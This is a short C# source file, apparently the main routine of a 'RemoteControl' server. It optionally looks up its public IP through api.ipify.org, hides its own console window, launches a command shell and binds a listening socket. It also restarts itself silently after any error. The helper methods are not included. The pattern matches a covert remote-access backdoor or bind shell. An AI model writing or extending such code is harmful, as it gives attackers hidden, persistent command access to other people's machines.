using System;
using System.Net;

namespace RemoteControl
{
    partial class Server
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.White;
            IPAddress ipAddress;
            if (args.Length == 0)
            {
                ipAddress = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName()).AddressList[0];
#if ONLINE_NETWORK
                string ipAdd = new System.Net.WebClient().DownloadString("https://api.ipify.org");
                ipAddress = IPAddress.Parse(ipAdd);
#endif
#if MANUAL_INIT
                Console.Write("IP Address: ");
                ipAddress = IPAddress.Parse(Console.ReadLine());
#endif
            }
            else
            {
                ipAddress = IPAddress.Parse(args[0]);
            }
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
#if CONSOLE_REDIRECT
            Console.SetOut(sw);
#endif
            server_restart:
            try
            {
                AuthorizationData("");
                LaunchCmd("");
                Bind(ipAddress, "");
                Listen("", " ");
                Console.ReadKey();
            }
            catch { goto server_restart; }
        }
    }
}
